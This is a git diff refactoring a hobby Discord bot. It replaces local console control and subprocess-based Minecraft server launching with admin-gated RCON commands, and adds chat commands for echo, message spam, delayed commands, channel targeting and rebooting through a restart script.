@@ -4,54 +4,43 @@ import asyncio
 import logging
 import os
 import socket
-import sys
 import subprocess
-import discord
-
 from datetime import datetime, timezone
-from typing import Optional
+
+import discord
 from discord.ext import commands
 from dotenv import load_dotenv
+from mcrcon import MCRcon
 
 
 # ============================================================
 # Configuration
 # ============================================================
 
+load_dotenv()
+
 LOG_FILE = "bot.log"
 CHAT_LOG_FILE = "chat.log"
 
-load_dotenv()
-
-logging.basicConfig(level=logging.INFO, format="%(message)s")
-logger = logging.getLogger("bobbot9000")
-
-
-# ============================================================
-# Minecraft Server Configuration
-# ============================================================
-
-MINECRAFT_SERVER_DIR = "/home/firebot/Downloads/minecraft_server"
-
-MINECRAFT_SERVER_JAR = (
-    "fabric-server-mc.1.21.1-loader.0.19.3-launcher.1.1.2.jar"
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(message)s"
 )
 
-MINECRAFT_SERVER_COMMAND = [
-    "java",
-    "-Xmx3G",
-    "-Xms3G",
-    "-jar",
-    MINECRAFT_SERVER_JAR,
-    "nogui",
-]
-
-minecraft_server_process: Optional[subprocess.Popen] = None
+logger = logging.getLogger("bobbot9000")
 
 
 # ============================================================
 # Discord Configuration
 # ============================================================
+
+DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
+
+if not DISCORD_TOKEN:
+    raise RuntimeError(
+        "DISCORD_TOKEN environment variable is missing."
+    )
+
 
 intents = discord.Intents.default()
 intents.guilds = True
@@ -59,10 +48,51 @@ intents.guild_messages = True
 intents.messages = True
 intents.members = True
 
+
 bot = commands.Bot(
-    command_prefix="!",
+    command_prefix="~",
     intents=intents,
     help_command=None
+)
+
+
+# ============================================================
+# Minecraft RCON Configuration
+# ============================================================
+
+MINECRAFT_RCON_HOST = os.getenv(
+    "MINECRAFT_RCON_HOST",
+    "127.0.0.1"
+)
+
+MINECRAFT_RCON_PORT = int(
+    os.getenv(
+        "MINECRAFT_RCON_PORT",
+        "25575"
+    )
+)
+
+MINECRAFT_RCON_PASSWORD = os.getenv(
+    "MINECRAFT_RCON_PASSWORD"
+)
+
+if not MINECRAFT_RCON_PASSWORD:
+    raise RuntimeError(
+        "MINECRAFT_RCON_PASSWORD environment variable is missing."
+    )
+
+
+# ============================================================
+# Bot Restart Configuration
+# ============================================================
+
+BOT_DIRECTORY = os.path.dirname(
+    os.path.abspath(__file__)
+)
+
+RESTART_SCRIPT = os.path.join(
+    BOT_DIRECTORY,
+    "restart.sh"
 )
 
 
@@ -70,16 +100,16 @@ bot = commands.Bot(
 # Global State
 # ============================================================
 
-current_target_server: str = "all"
-current_target_channel: str = "all"
+current_target_server = "all"
+current_target_channel = "all"
 
-active_spam_tasks: list[asyncio.Task] = []
+active_tasks: list[asyncio.Task] = []
 
-pending_reboot: bool = False
+pending_reboot = False
 
 
 # ============================================================
-# Chat Deduplication State
+# Chat Deduplication
 # ============================================================
 
 last_chat_data = {
@@ -89,7 +119,7 @@ last_chat_data = {
     "author_id": None,
     "content": None,
     "timestamp": None,
-    "count": 0
+    "count": 0,
 }
 
 
@@ -98,89 +128,49 @@ last_chat_data = {
 # ============================================================
 
 def flush_chat_log() -> None:
-    """Flush any buffered duplicate chat message streak into chat.log."""
 
     global last_chat_data
 
-    if last_chat_data["content"] is not None:
+    if last_chat_data["content"] is None:
+        return
 
-        content_str = last_chat_data["content"]
+    content = last_chat_data["content"]
 
-        if last_chat_data["count"] > 1:
-            content_str = (
-                f"{content_str} ({last_chat_data['count']})"
-            )
-
-        line = (
-            f"[{last_chat_data['timestamp']}] "
-            f'Guild="{last_chat_data["guild"]}" | '
-            f'Channel="#{last_chat_data["channel"]}" | '
-            f'User="{last_chat_data["author"]}" '
-            f'({last_chat_data["author_id"]}) | '
-            f'Content="{content_str}"'
+    if last_chat_data["count"] > 1:
+        content = (
+            f"{content} "
+            f"({last_chat_data['count']})"
         )
 
-        try:
-            with open(
-                CHAT_LOG_FILE,
-                "a",
-                encoding="utf-8"
-            ) as f:
-                f.write(line + "\n")
+    line = (
+        f"[{last_chat_data['timestamp']}] "
+        f'Guild="{last_chat_data["guild"]}" | '
+        f'Channel="#{last_chat_data["channel"]}" | '
+        f'User="{last_chat_data["author"]}" '
+        f'({last_chat_data["author_id"]}) | '
+        f'Content="{content}"'
+    )
 
-        except Exception as e:
-            logger.error(
-                f"Failed to write chat log: {e}"
+    try:
+
+        with open(
+            CHAT_LOG_FILE,
+            "a",
+            encoding="utf-8"
+        ) as file:
+
+            file.write(
+                line + "\n"
             )
 
-        last_chat_data["count"] = 0
-        last_chat_data["content"] = None
+    except OSError as e:
 
-
-# ============================================================
-# Remote Console Output
-# ============================================================
-
-async def output_to_bot(content: str) -> None:
-    """
-    Mirrors console text output to the remote-controlled-bob
-    channel in any server containing 'yap' in its name.
-    """
-
-    for guild in bot.guilds:
-
-        if "yap" in guild.name.lower():
-
-            for channel in guild.text_channels:
-
-                if channel.name.lower() == "remote-controlled-bob":
-
-                    try:
-                        clean_content = content.strip()
-
-                        if clean_content:
-                            await channel.send(
-                                f"```text\n{clean_content}\n```"
-                            )
-
-                    except Exception:
-                        pass
-
-                    return
-
-
-def cprint(content: str = "") -> None:
-    """
-    Prints locally to stdout/logs and schedules a mirror
-    transmission to the remote Discord bot channel.
-    """
-
-    print(content)
-
-    if bot.is_ready():
-        bot.loop.create_task(
-            output_to_bot(content)
+        logger.error(
+            f"Failed to write chat log: {e}"
         )
+
+    last_chat_data["count"] = 0
+    last_chat_data["content"] = None
 
 
 # ============================================================
@@ -189,35 +179,42 @@ def cprint(content: str = "") -> None:
 
 def log_action(
     *,
-    guild: discord.Guild,
-    channel: discord.abc.GuildChannel,
+    guild: discord.Guild | None,
+    channel: discord.abc.Messageable | None,
     user: discord.abc.User,
     command: str,
     action: str,
     success: bool = True,
 ) -> None:
 
-    guild_name = guild.name
+    guild_name = (
+        guild.name
+        if guild
+        else "DM"
+    )
+
     channel_name = getattr(
         channel,
         "name",
         "unknown"
     )
 
-    tag = (
+    username = (
         f"{user.name}#{user.discriminator}"
         if user.discriminator != "0"
         else user.name
     )
 
-    now = datetime.now(timezone.utc).isoformat()
+    now = datetime.now(
+        timezone.utc
+    ).isoformat()
 
     line = (
         f"[{now}] "
         f"{'SUCCESS' if success else 'ERROR'} | "
         f'Guild="{guild_name}" | '
         f'Channel="#{channel_name}" | '
-        f'User="{tag}" ({user.id}) | '
+        f'User="{username}" ({user.id}) | '
         f'Command="{command}" | '
         f'Action="{action}"'
     )
@@ -225,591 +222,82 @@ def log_action(
     logger.info(line)
 
     try:
+
         with open(
             LOG_FILE,
             "a",
             encoding="utf-8"
         ) as file:
-            file.write(line + "\n")
 
-    except Exception as e:
+            file.write(
+                line + "\n"
+            )
+
+    except OSError as e:
+
         logger.error(
             f"Failed to write audit log: {e}"
         )
 
 
 # ============================================================
-# Discord Response Helper
+# Permission Check
 # ============================================================
 
-async def send_response(
-    target: discord.abc.Messageable,
-    content: str
-) -> None:
+def is_admin():
 
-    await target.send(content)
+    async def predicate(
+        ctx: commands.Context
+    ) -> bool:
+
+        if ctx.guild is None:
+            return False
+
+        return (
+            ctx.author.guild_permissions.administrator
+        )
+
+    return commands.check(
+        predicate
+    )
 
 
 # ============================================================
-# Diagnostic System
+# Minecraft RCON
 # ============================================================
 
-def generate_diagnostic_report(
-    target: discord.abc.Messageable
+def minecraft_command(
+    command: str
 ) -> str:
 
-    guild = getattr(target, "guild", None)
+    with MCRcon(
+        MINECRAFT_RCON_HOST,
+        MINECRAFT_RCON_PASSWORD,
+        port=MINECRAFT_RCON_PORT,
+    ) as rcon:
 
-    hostname = socket.gethostname()
+        return rcon.command(
+            command
+        )
 
-    if hostname.lower() == "plasmadmin-xps-8910":
-        hostname = "plasmadmin-xps-8910(firebot)"
 
-    latency_ms = round(bot.latency * 1000)
+async def run_minecraft_command(
+    command: str
+) -> str:
 
-    env_status = (
-        "Loaded"
-        if os.getenv("DISCORD_TOKEN")
-        else "Missing"
+    return await asyncio.to_thread(
+        minecraft_command,
+        command
     )
-
-    guild_count = len(bot.guilds)
-
-    server_name = (
-        guild.name
-        if guild
-        else "Direct/Terminal Context"
-    )
-
-    server_id = (
-        guild.id
-        if guild
-        else "N/A"
-    )
-
-    me = guild.me if guild else None
-
-    if me:
-
-        perms = me.guild_permissions
-
-        audit_perms = []
-
-        if perms.administrator:
-            audit_perms.append("Administrator")
-
-        else:
-
-            if perms.manage_guild:
-                audit_perms.append("Manage Server")
-
-            if perms.manage_roles:
-                audit_perms.append("Manage Roles")
-
-            if perms.manage_channels:
-                audit_perms.append("Manage Channels")
-
-            if perms.kick_members:
-                audit_perms.append("Kick")
-
-            if perms.manage_messages:
-                audit_perms.append("Manage Messages")
-
-        perms_str = (
-            ", ".join(audit_perms)
-            if audit_perms
-            else "Standard User"
-        )
-
-    else:
-        perms_str = "Unknown"
-
-    return f"""```markdown
-# Diagnostic Report
------------------------------------------
-• Status: Online
-• Host Machine: {hostname}
-• Discord Server: {server_name} ({server_id})
-• Latency: {latency_ms}ms
-• Environment: {env_status}
-• Connected Guilds: {guild_count}
-• Core Permissions: {perms_str}
------------------------------------------
-```"""
-
-
-async def do_test(
-    target: discord.abc.Messageable
-) -> None:
-
-    report_text = generate_diagnostic_report(target)
-
-    await send_response(
-        target,
-        report_text
-    )
-
-    target_name = (
-        getattr(
-            getattr(target, "guild", None),
-            "name",
-            "Terminal"
-        )
-    )
-
-    channel_name = getattr(
-        target,
-        "name",
-        "unknown"
-    )
-
-    cprint(
-        f"\n[Test Output for "
-        f"{target_name} -> #{channel_name}]\n"
-        f"{report_text}"
-    )
-
-
-async def do_echo(
-    target: discord.abc.Messageable,
-    message: str
-) -> None:
-
-    await send_response(
-        target,
-        message
-    )
-
-
-async def do_spam(
-    target: discord.abc.Messageable,
-    count: int,
-    message: str
-) -> None:
-
-    for _ in range(count):
-
-        await send_response(
-            target,
-            message
-        )
-
-        await asyncio.sleep(0.5)
-
-
-# ============================================================
-# Minecraft Server Control
-# ============================================================
-
-def stop_minecraft_server() -> None:
-    """
-    Stops the existing Minecraft server.
-
-    First attempts to terminate the process started by this bot.
-    Then uses pkill as a fallback for a server that was already
-    running before the bot started.
-    """
-
-    global minecraft_server_process
-
-    # --------------------------------------------------------
-    # Stop the process tracked by this bot
-    # --------------------------------------------------------
-
-    if minecraft_server_process is not None:
-
-        if minecraft_server_process.poll() is None:
-
-            logger.info(
-                "[Minecraft] Stopping existing server process..."
-            )
-
-            try:
-
-                minecraft_server_process.terminate()
-
-                minecraft_server_process.wait(
-                    timeout=10
-                )
-
-                logger.info(
-                    "[Minecraft] Server stopped gracefully."
-                )
-
-            except subprocess.TimeoutExpired:
-
-                logger.warning(
-                    "[Minecraft] Server did not stop "
-                    "within 10 seconds. Killing it..."
-                )
-
-                minecraft_server_process.kill()
-
-                minecraft_server_process.wait()
-
-            except Exception as e:
-
-                logger.error(
-                    "[Minecraft] Failed to stop tracked "
-                    f"server process: {e}"
-                )
-
-        minecraft_server_process = None
-
-    # --------------------------------------------------------
-    # Catch servers started outside the bot
-    # --------------------------------------------------------
-
-    try:
-
-        result = subprocess.run(
-            [
-                "pkill",
-                "-f",
-                MINECRAFT_SERVER_JAR
-            ],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            check=False
-        )
-
-        if result.returncode == 0:
-
-            logger.info(
-                "[Minecraft] Stopped existing Fabric "
-                "server process."
-            )
-
-        elif result.returncode == 1:
-
-            logger.info(
-                "[Minecraft] No existing Fabric "
-                "server process found."
-            )
-
-        else:
-
-            logger.warning(
-                "[Minecraft] pkill returned "
-                f"exit code {result.returncode}."
-            )
-
-    except Exception as e:
-
-        logger.error(
-            "[Minecraft] Failed to search for existing "
-            f"server process: {e}"
-        )
-
-
-def start_minecraft_server() -> subprocess.Popen:
-    """Starts the Froggo SMP Minecraft server."""
-
-    global minecraft_server_process
-
-    # --------------------------------------------------------
-    # Validate server directory
-    # --------------------------------------------------------
-
-    if not os.path.isdir(
-        MINECRAFT_SERVER_DIR
-    ):
-
-        raise FileNotFoundError(
-            "Minecraft server directory does not exist: "
-            f"{MINECRAFT_SERVER_DIR}"
-        )
-
-    # --------------------------------------------------------
-    # Validate server JAR
-    # --------------------------------------------------------
-
-    jar_path = os.path.join(
-        MINECRAFT_SERVER_DIR,
-        MINECRAFT_SERVER_JAR
-    )
-
-    if not os.path.isfile(jar_path):
-
-        raise FileNotFoundError(
-            "Minecraft server JAR does not exist: "
-            f"{jar_path}"
-        )
-
-    # --------------------------------------------------------
-    # Start server
-    # --------------------------------------------------------
-
-    logger.info(
-        "[Minecraft] Starting Froggo SMP server..."
-    )
-
-    minecraft_server_process = subprocess.Popen(
-        MINECRAFT_SERVER_COMMAND,
-        cwd=MINECRAFT_SERVER_DIR,
-        stdin=subprocess.DEVNULL,
-        stdout=None,
-        stderr=None,
-        start_new_session=True,
-    )
-
-    logger.info(
-        "[Minecraft] Server started with PID "
-        f"{minecraft_server_process.pid}"
-    )
-
-    return minecraft_server_process
-
-
-async def restart_minecraft_server() -> tuple[bool, str]:
-    """
-    Stops the old Minecraft server and starts a new one.
-    """
-
-    try:
-
-        # Stop existing server without blocking
-        # Discord's asyncio event loop.
-        await asyncio.to_thread(
-            stop_minecraft_server
-        )
-
-        # Give Java/Linux a moment to release
-        # ports and files.
-        await asyncio.sleep(2)
-
-        # Start new server without blocking
-        # Discord's asyncio event loop.
-        process = await asyncio.to_thread(
-            start_minecraft_server
-        )
-
-        return (
-            True,
-            "Minecraft server started successfully. "
-            f"PID: `{process.pid}`"
-        )
-
-    except Exception as e:
-
-        logger.exception(
-            "[Minecraft] Failed to restart server"
-        )
-
-        return (
-            False,
-            f"Minecraft server failed to start: `{e}`"
-        )
-
-
-# ============================================================
-# Delayed Commands
-# ============================================================
-
-async def run_delayed_command(
-    delay: int,
-    full_cmd_string: str,
-    target_context: Optional[
-        discord.abc.Messageable
-    ] = None
-):
-
-    try:
-
-        await asyncio.sleep(delay)
-
-        parts = full_cmd_string.split(
-            " ",
-            1
-        )
-
-        cmd = parts[0].lower()
-
-        args = (
-            parts[1]
-            if len(parts) > 1
-            else ""
-        )
-
-        channels = resolve_targets(cmd)
-
-        if not channels and target_context:
-            channels = [target_context]
-
-        if cmd == "test":
-
-            for ch in channels:
-                await do_test(ch)
-
-        elif cmd == "echo":
-
-            if args:
-
-                for ch in channels:
-                    await do_echo(
-                        ch,
-                        args
-                    )
-
-        elif cmd == "spam":
-
-            spam_parts = args.split(
-                " ",
-                1
-            )
-
-            if (
-                len(spam_parts) >= 2
-                and spam_parts[0].isdigit()
-            ):
-
-                count = int(
-                    spam_parts[0]
-                )
-
-                msg = spam_parts[1]
-
-                async def run_spam():
-
-                    for ch in channels:
-
-                        await do_spam(
-                            ch,
-                            count,
-                            msg
-                        )
-
-                task = asyncio.create_task(
-                    run_spam()
-                )
-
-                active_spam_tasks.append(task)
-
-                task.add_done_callback(
-                    lambda t:
-                    active_spam_tasks.remove(t)
-                    if t in active_spam_tasks
-                    else None
-                )
-
-    except asyncio.CancelledError:
-        pass
-
-
-# ============================================================
-# Reboot Watcher
-# ============================================================
-
-async def reboot_watcher():
-
-    global pending_reboot
-
-    while not bot.is_closed():
-
-        if pending_reboot:
-
-            cprint(
-                "[System] Reboot command detected. "
-                "Executing restart sequence..."
-            )
-
-            flush_chat_log()
-
-            subprocess.Popen(
-                ["./restart.sh"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL,
-                start_new_session=True
-            )
-
-            await bot.close()
-
-            os._exit(0)
-
-        await asyncio.sleep(0.1)
 
 
 # ============================================================
 # Target Resolver
 # ============================================================
 
-def resolve_targets(
-    cmd_type: str
-) -> list[discord.abc.Messageable]:
-
-    global current_target_server
-    global current_target_channel
+def resolve_targets() -> list[discord.TextChannel]:
 
     targets = []
-
-    resolved_channel_name = current_target_channel
-
-    # --------------------------------------------------------
-    # Resolve partial channel names
-    # --------------------------------------------------------
-
-    if current_target_channel != "all":
-
-        all_channel_names = set()
-
-        for guild in bot.guilds:
-
-            if (
-                current_target_server != "all"
-                and current_target_server.lower()
-                not in guild.name.lower()
-            ):
-                continue
-
-            for channel in guild.text_channels:
-
-                if channel.permissions_for(
-                    guild.me
-                ).send_messages:
-
-                    all_channel_names.add(
-                        channel.name.lower()
-                    )
-
-        if (
-            current_target_channel.lower()
-            not in all_channel_names
-        ):
-
-            matching_names = [
-                name
-                for name in all_channel_names
-                if name.startswith(
-                    current_target_channel.lower()
-                )
-            ]
-
-            if len(matching_names) == 1:
-
-                resolved_channel_name = (
-                    matching_names[0]
-                )
-
-                cprint(
-                    "[Console] Autofilled channel "
-                    f"target to: "
-                    f"#{resolved_channel_name}"
-                )
-
-            elif len(matching_names) > 1:
-
-                cprint(
-                    "[Console Warning] Ambiguous "
-                    f"channel prefix "
-                    f"'{current_target_channel}' "
-                    f"matches multiple channels: "
-                    f"{matching_names}"
-                )
-
-    # --------------------------------------------------------
-    # Find targets
-    # --------------------------------------------------------
 
     for guild in bot.guilds:
 
@@ -822,555 +310,789 @@ def resolve_targets(
 
         for channel in guild.text_channels:
 
-            if not channel.permissions_for(
+            permissions = channel.permissions_for(
                 guild.me
-            ).send_messages:
+            )
+
+            if not permissions.send_messages:
                 continue
 
             if (
-                resolved_channel_name == "all"
+                current_target_channel == "all"
                 or channel.name.lower()
-                == resolved_channel_name.lower()
+                == current_target_channel.lower()
             ):
 
-                targets.append(channel)
+                targets.append(
+                    channel
+                )
 
     return targets
 
 
 # ============================================================
-# Console Controller
+# Execute Delayed Command
 # ============================================================
 
-async def console_controller():
+async def execute_delayed_command(
+    ctx: commands.Context,
+    command_string: str
+):
+
+    try:
+
+        message = command_string.strip()
+
+        if not message:
+            return
+
+        if message.startswith("~"):
+            message = message[1:].strip()
+
+        parts = message.split(
+            " ",
+            1
+        )
+
+        command_name = parts[0]
+
+        command_args = (
+            parts[1]
+            if len(parts) > 1
+            else ""
+        )
+
+        command = bot.get_command(
+            command_name
+        )
+
+        if command is None:
+
+            await ctx.channel.send(
+                f"`Unknown delayed command: "
+                f"{command_name}`"
+            )
+
+            return
+
+        fake_message = ctx.message
+
+        fake_message.content = (
+            f"~{command_name}"
+            + (
+                f" {command_args}"
+                if command_args
+                else ""
+            )
+        )
+
+        await bot.process_commands(
+            fake_message
+        )
+
+    except asyncio.CancelledError:
+        return
+
+    except Exception as e:
+
+        logger.exception(
+            "[Delay] Delayed command failed"
+        )
+
+        await ctx.channel.send(
+            f"`Delayed command error: {e}`"
+        )
+
+
+# ============================================================
+# Minecraft Command
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def mc(
+    ctx: commands.Context,
+    *,
+    command: str
+):
+
+    await ctx.send(
+        "`[Minecraft] Executing command...`"
+    )
+
+    try:
+
+        response = await run_minecraft_command(
+            command
+        )
+
+        if not response:
+            response = (
+                "Command executed successfully."
+            )
+
+        response = response[:1900]
+
+        await ctx.send(
+            f"```text\n"
+            f"{response}"
+            f"\n```"
+        )
+
+        log_action(
+            guild=ctx.guild,
+            channel=ctx.channel,
+            user=ctx.author,
+            command=f"~mc {command}",
+            action=response,
+        )
+
+    except Exception as e:
+
+        logger.exception(
+            "[Minecraft] RCON command failed"
+        )
+
+        await ctx.send(
+            "```text\n"
+            f"Minecraft RCON error:\n{e}"
+            "\n```"
+        )
+
+        log_action(
+            guild=ctx.guild,
+            channel=ctx.channel,
+            user=ctx.author,
+            command=f"~mc {command}",
+            action=str(e),
+            success=False,
+        )
+
+
+# ============================================================
+# Minecraft Say
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def mcsay(
+    ctx: commands.Context,
+    *,
+    message: str
+):
+
+    command = f"say {message}"
+
+    try:
+
+        response = await run_minecraft_command(
+            command
+        )
+
+        if not response:
+            response = "Message sent."
+
+        await ctx.send(
+            f"```text\n"
+            f"{response[:1900]}"
+            f"\n```"
+        )
+
+        log_action(
+            guild=ctx.guild,
+            channel=ctx.channel,
+            user=ctx.author,
+            command=f"~mcsay {message}",
+            action=response,
+        )
+
+    except Exception as e:
+
+        await ctx.send(
+            f"`Minecraft RCON error: {e}`"
+        )
+
+        log_action(
+            guild=ctx.guild,
+            channel=ctx.channel,
+            user=ctx.author,
+            command=f"~mcsay {message}",
+            action=str(e),
+            success=False,
+        )
+
+
+# ============================================================
+# Minecraft Status
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def mcstatus(
+    ctx: commands.Context
+):
+
+    try:
+
+        response = await run_minecraft_command(
+            "list"
+        )
+
+        if not response:
+            response = (
+                "Minecraft server responded."
+            )
+
+        await ctx.send(
+            f"```text\n"
+            f"{response[:1900]}"
+            f"\n```"
+        )
+
+    except Exception as e:
+
+        await ctx.send(
+            "```text\n"
+            f"Minecraft RCON unavailable:\n{e}"
+            "\n```"
+        )
+
+
+# ============================================================
+# Test
+# ============================================================
+
+@bot.command()
+async def test(
+    ctx: commands.Context
+):
+
+    hostname = socket.gethostname()
+
+    latency = round(
+        bot.latency * 1000
+    )
+
+    await ctx.send(
+        "```text\n"
+        "Diagnostic Report\n"
+        "-------------------------\n"
+        "Status: Online\n"
+        f"Host: {hostname}\n"
+        f"Latency: {latency}ms\n"
+        f"Connected Guilds: {len(bot.guilds)}\n"
+        f"RCON Host: {MINECRAFT_RCON_HOST}\n"
+        f"RCON Port: {MINECRAFT_RCON_PORT}\n"
+        "-------------------------\n"
+        "```"
+    )
+
+
+# ============================================================
+# Echo
+# ============================================================
+
+@bot.command()
+async def echo(
+    ctx: commands.Context,
+    *,
+    message: str
+):
+
+    await ctx.send(
+        message
+    )
+
+    log_action(
+        guild=ctx.guild,
+        channel=ctx.channel,
+        user=ctx.author,
+        command=f"~echo {message}",
+        action="Discord echo"
+    )
+
+
+# ============================================================
+# Spam
+# ============================================================
+
+@bot.command()
+async def spam(
+    ctx: commands.Context,
+    count: int,
+    *,
+    message: str
+):
+
+    if count < 1:
+
+        await ctx.send(
+            "Count must be at least 1."
+        )
+
+        return
+
+    if count > 100:
+
+        await ctx.send(
+            "Maximum spam count is 100."
+        )
+
+        return
+
+    async def spam_task():
+
+        try:
+
+            targets = resolve_targets()
+
+            if not targets:
+                targets = [ctx.channel]
+
+            for target in targets:
+
+                for _ in range(count):
+
+                    await target.send(
+                        message
+                    )
+
+                    await asyncio.sleep(
+                        0.5
+                    )
+
+        except asyncio.CancelledError:
+            pass
+
+    task = asyncio.create_task(
+        spam_task()
+    )
+
+    active_tasks.append(
+        task
+    )
+
+    def remove_task(
+        completed_task: asyncio.Task
+    ):
+
+        if completed_task in active_tasks:
+
+            active_tasks.remove(
+                completed_task
+            )
+
+    task.add_done_callback(
+        remove_task
+    )
+
+    await ctx.send(
+        f"Started spam task: "
+        f"`{count}` messages."
+    )
+
+
+# ============================================================
+# Stop
+# ============================================================
+
+@bot.command()
+async def stop(
+    ctx: commands.Context
+):
+
+    count = len(
+        active_tasks
+    )
+
+    for task in active_tasks:
+        task.cancel()
+
+    active_tasks.clear()
+
+    await ctx.send(
+        f"Cancelled `{count}` active task(s)."
+    )
+
+
+# ============================================================
+# Delay
+# ============================================================
+
+@bot.command()
+async def delay(
+    ctx: commands.Context,
+    seconds: int,
+    *,
+    command: str
+):
+
+    if seconds < 0:
+
+        await ctx.send(
+            "Delay cannot be negative."
+        )
+
+        return
+
+    async def delayed_task():
+
+        try:
+
+            await asyncio.sleep(
+                seconds
+            )
+
+            await execute_delayed_command(
+                ctx,
+                command
+            )
+
+        except asyncio.CancelledError:
+            pass
+
+    task = asyncio.create_task(
+        delayed_task()
+    )
+
+    active_tasks.append(
+        task
+    )
+
+    task.add_done_callback(
+        lambda t:
+        active_tasks.remove(t)
+        if t in active_tasks
+        else None
+    )
+
+    await ctx.send(
+        f"Scheduled command in "
+        f"`{seconds}` seconds."
+    )
+
+
+# ============================================================
+# Set Target
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def settarget(
+    ctx: commands.Context,
+    target_type: str,
+    *,
+    value: str
+):
 
     global current_target_server
     global current_target_channel
-    global active_spam_tasks
+
+    target_type = target_type.lower()
+
+    if target_type == "server":
+
+        current_target_server = value
+
+    elif target_type == "channel":
+
+        clean_value = (
+            value
+            .removeprefix("#")
+            .lower()
+        )
+
+        current_target_channel = (
+            clean_value
+        )
+
+    else:
+
+        await ctx.send(
+            "Usage:\n"
+            "`~settarget server <name|all>`\n"
+            "`~settarget channel <name|all>`"
+        )
+
+        return
+
+    await ctx.send(
+        "```text\n"
+        f"Target server: "
+        f"{current_target_server}\n"
+        f"Target channel: "
+        f"#{current_target_channel}\n"
+        "```"
+    )
+
+
+# ============================================================
+# Targets
+# ============================================================
+
+@bot.command()
+async def targets(
+    ctx: commands.Context
+):
+
+    await ctx.send(
+        "```text\n"
+        f"Server: {current_target_server}\n"
+        f"Channel: #{current_target_channel}\n"
+        "```"
+    )
+
+
+# ============================================================
+# Servers
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def servers(
+    ctx: commands.Context
+):
+
+    output = [
+        "Connected Discord Servers",
+        "-------------------------"
+    ]
+
+    for guild in bot.guilds:
+
+        output.append(
+            f"{guild.name} ({guild.id})"
+        )
+
+        for channel in guild.text_channels:
+
+            permissions = channel.permissions_for(
+                guild.me
+            )
+
+            if permissions.send_messages:
+
+                output.append(
+                    f"  #{channel.name}"
+                )
+
+    text = "\n".join(
+        output
+    )
+
+    await ctx.send(
+        f"```text\n"
+        f"{text[:1900]}"
+        f"\n```"
+    )
+
+
+# ============================================================
+# Reboot
+# ============================================================
+
+@bot.command()
+@is_admin()
+async def reboot(
+    ctx: commands.Context
+):
+
+    global pending_reboot
+
+    await ctx.send(
+        "`[System] Reboot flag set. "
+        "Restarting bot...`"
+    )
+
+    log_action(
+        guild=ctx.guild,
+        channel=ctx.channel,
+        user=ctx.author,
+        command="~reboot",
+        action="Bot restart requested"
+    )
+
+    pending_reboot = True
+
+
+# ============================================================
+# Reboot Watcher
+# ============================================================
+
+async def reboot_watcher():
+
     global pending_reboot
 
     await bot.wait_until_ready()
 
-    cprint(
-        "\n[Console Controller Active] "
-        f"Connected to {len(bot.guilds)} guild(s)."
-    )
-
-    cprint(
-        f"Current Target Server: "
-        f"'{current_target_server}' | "
-        f"Target Channel: "
-        f"#{current_target_channel}"
-    )
-
-    cprint(
-        "Commands: test, echo <msg>, "
-        "spam <number> <msg>, stop, "
-        "delay <seconds> <cmd>, set, "
-        "servers, help, reboot, exit\n"
-    )
-
-    loop = asyncio.get_running_loop()
-
     while not bot.is_closed():
 
-        try:
+        if pending_reboot:
 
-            line = await loop.run_in_executor(
-                None,
-                sys.stdin.readline
+            logger.info(
+                "[System] Reboot command detected."
             )
 
-            if not line:
+            flush_chat_log()
 
-                await asyncio.sleep(1)
+            if not os.path.isfile(
+                RESTART_SCRIPT
+            ):
+
+                logger.error(
+                    "[System] restart.sh not found: "
+                    f"{RESTART_SCRIPT}"
+                )
+
+                pending_reboot = False
+
+                await asyncio.sleep(
+                    2
+                )
+
                 continue
 
-            content = line.strip()
+            try:
 
-            if not content:
+                subprocess.Popen(
+                    [RESTART_SCRIPT],
+                    cwd=BOT_DIRECTORY,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL,
+                    start_new_session=True
+                )
+
+                logger.info(
+                    "[System] restart.sh launched."
+                )
+
+            except Exception:
+
+                logger.exception(
+                    "[System] Failed to launch restart.sh"
+                )
+
+                pending_reboot = False
+
+                await asyncio.sleep(
+                    2
+                )
+
                 continue
 
-            parts = content.split(
-                " ",
+            await asyncio.sleep(
                 1
             )
 
-            cmd = parts[0].lower()
-
-            args = (
-                parts[1]
-                if len(parts) > 1
-                else ""
-            )
-
-            # ------------------------------------------------
-            # Exit
-            # ------------------------------------------------
-
-            if cmd == "exit":
-
-                cprint(
-                    "[Console] Shutting down bot..."
-                )
-
-                flush_chat_log()
-
-                await bot.close()
-
-                break
-
-            # ------------------------------------------------
-            # Reboot
-            # ------------------------------------------------
-
-            if cmd.startswith("reboot"):
-
-                cprint(
-                    "[Console] Reboot flag set. "
-                    "Will reboot now."
-                )
-
-                pending_reboot = True
-
-                break
-
-            # ------------------------------------------------
-            # Stop
-            # ------------------------------------------------
-
-            if cmd == "stop":
-
-                count = len(
-                    active_spam_tasks
-                )
-
-                for task in active_spam_tasks:
-                    task.cancel()
-
-                active_spam_tasks.clear()
-
-                cprint(
-                    "[Console Success] Cancelled "
-                    f"{count} active task(s)."
-                )
-
-                continue
-
-            # ------------------------------------------------
-            # Help
-            # ------------------------------------------------
-
-            if cmd == "help":
-
-                cprint(
-                    "\n--- Available Console Commands ---\n"
-                    "• test - Send diagnostic report\n"
-                    "• echo <msg> - Send message\n"
-                    "• spam <number> <msg> - Repeated messages\n"
-                    "• delay <secs> <cmd> - Delayed command\n"
-                    "• stop - Halt background tasks\n"
-                    "• set <server|channel> <name|all>\n"
-                    "• servers - List connected servers\n"
-                    "• reboot - Hard reboot and git pull\n"
-                    "• help - Show this help\n"
-                    "• exit - Shut down the bot\n"
-                    "----------------------------------\n"
-                )
-
-                continue
-
-            # ------------------------------------------------
-            # Servers
-            # ------------------------------------------------
-
-            if cmd == "servers":
-
-                server_summary = (
-                    "\n--- Connected Servers & Channels ---\n"
-                )
-
-                for g in bot.guilds:
-
-                    channels = [
-                        c.name
-                        for c in g.text_channels
-                        if c.permissions_for(
-                            g.me
-                        ).send_messages
-                    ]
-
-                    server_summary += (
-                        f"• {g.name} "
-                        f"(ID: {g.id})\n"
-                        f"  Channels: "
-                        f"{', '.join(channels)}\n"
-                    )
-
-                server_summary += (
-                    "------------------------------------\n"
-                )
-
-                cprint(server_summary)
